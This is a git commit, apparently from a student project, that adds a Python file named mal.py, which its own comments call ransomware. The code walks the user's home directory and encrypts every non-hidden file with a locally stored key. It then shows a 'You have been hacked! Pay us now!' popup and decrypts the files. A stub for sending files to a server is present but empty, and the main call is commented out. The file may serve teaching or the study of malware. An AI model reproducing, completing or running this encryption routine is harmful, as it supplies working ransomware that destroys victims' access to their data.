9c41375cebdd500746b93f80b0badda5e2e945fc
marom <m.sverdlov@student.tue.nl>
2023-05-28 10:08:27 +0200

    Fixed issue with not encyrpting files at the highest dir.

---
+++ mal.py
@@ -0,0 +1,127 @@
+import os
+from os.path import expanduser
+from cryptography.fernet import Fernet
+import base64
+import subprocess
+
+
+# Home directory
+home = expanduser("~")
+
+
+def send_file_to_server(file_path):
+    return
+
+
+def generate_key():
+    if not os.path.isfile("./key.key"):
+        key = Fernet.generate_key()
+        with open("key.key", "wb") as the_key:
+            the_key.write(key)
+
+
+# Method that lists all of the non-hidden, non-vital  directories bellow the inserted directory
+def list_safe_directories(directory):
+
+    result = []
+    excluded_dirs = set([".", "..", ".Trash-1000", ".config", ".local", ".cache"])
+
+    # Go through all of the directories and exlcude the ones in the excluded_dirs set
+    for root, dirs, _ in os.walk(directory):
+        dirs[:] = [d for d in dirs if not d.startswith(".") and d not in excluded_dirs]
+
+        result.append(root)
+        for directory in dirs:
+            result.append(os.path.join(root, directory))
+
+    return result  # Return the list of directories
+
+
+# Method that retrieves all of the files in a directory and purposely does not include the ransomeware
+def get_files_in_dir(directory):
+    # change to home directory so that the paths are correct relative paths.
+    os.chdir(directory)
+
+    files = []
+    for file in os.listdir(directory):
+        # We do not want to encrypt our own ransomware
+        if file == "mal.py" or file == "key.key":
+            continue
+        if os.path.isfile(file):
+            files.append(file)
+
+    return files
+
+
+# Method for encrypting a single file
+def encrypt_file(file, key):
+    print("started")
+    with open(file, "rb") as the_file:
+        contents = the_file.read()
+
+    encrypted_contents = Fernet(key).encrypt(contents)
+    with open(file, "wb") as the_file:
+        the_file.write(encrypted_contents)
+    print("terminated")
+
+
+# Encrypt all the safe to encrypt files on a victims pc
+def encrypt_and_send_all_files(directory, key):
+
+    number_of_files = 0
+    size_of_files = 0
+
+    dir_list = list_safe_directories(home)
+    for dir in dir_list:
+        for file in get_files_in_dir(dir):
+            file_path = os.path.join(dir, file)
+
+            file_size = os.path.getsize(file_path)
+            size_of_files += file_size
+            number_of_files += 1
+
+            # Send file to server
+            send_file_to_server(file_path)
+
+            # Encrypt file
+            encrypt_file(file_path, key)
+
+    print("Number of files encrypted: " + str(number_of_files))
+    print("Total size of files: " + str(size_of_files))
+
+
+def decrypt_file(file_path, key):
+    with open(file_path, "rb") as file:
+        encrypted_contents = file.read()
+
+    decrypted_contents = Fernet(key).decrypt(encrypted_contents)
+    with open(file_path, "wb") as the_file:
+        the_file.write(decrypted_contents)
+
+
+def decrypt_all_files(directory, key):
+    dir_list = list_safe_directories(home)
+    for dir in dir_list:
+        for file in get_files_in_dir(dir):
+            file_path = os.path.join(dir, file)
+            decrypt_file(file_path, key)
+
+
+def display_popup(message):
+    subprocess.call(["zenity", "--info", "--text", message])
+
+
+def main():
+    generate_key()
+    with open("key.key", "rb") as key:
+        key = key.read()
+
+    encrypt_and_send_all_files(home, key)
+    display_popup("You have been hacked! Pay us now!")
+    decrypt_all_files(home, key)
+
+
+# main()
+
+
+# print(list_safe_directories(directory))
